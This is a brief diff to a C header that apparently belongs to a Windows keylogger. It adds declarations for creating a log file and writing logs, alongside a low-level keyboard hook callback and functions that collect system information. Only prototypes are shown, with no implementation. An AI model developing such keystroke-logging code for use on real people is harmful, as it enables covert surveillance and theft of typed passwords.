@@ -30,6 +30,8 @@ void	get_cpu_info(void);
 void	get_windows_info(void);
 void	get_ram_info(void);
 
+int		create_log_file(void);
+void	write_logs(char *str);
 int		already_running(void);
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
